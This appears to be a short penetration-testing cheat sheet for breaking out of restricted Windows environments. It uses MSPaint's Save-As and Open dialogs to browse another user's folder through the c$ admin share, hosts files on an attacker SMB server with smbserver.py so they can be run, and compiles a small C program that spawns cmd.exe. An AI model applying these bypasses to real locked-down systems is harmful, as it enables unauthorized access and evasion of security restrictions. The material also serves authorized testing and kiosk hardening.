# File Browser Access Denied Bypass List

OS: Windows
Description: Use Save-As to access restricted locations
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)
Target_Technology: windows (https://www.notion.so/windows-1454c8e52376809bb701cef01e9f111a?pvs=21)

### File Browser Access Denied Bypass

- Open MSPaint or whatever
- File—>Save As

```jsx
 \\127.0.0.1\c$\users\pmorgan
```

### File Browser File Execution Bypass

- Spin up SMB server

```jsx
smbserver.py -smb2support share $(pwd)
```

- File-Open within MSPaint, right-click—>open

### Simple pwn.c

- Needs to be compiled.

```jsx
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

### Alternate File Explorers

```jsx
https://explorerplusplus.com/
```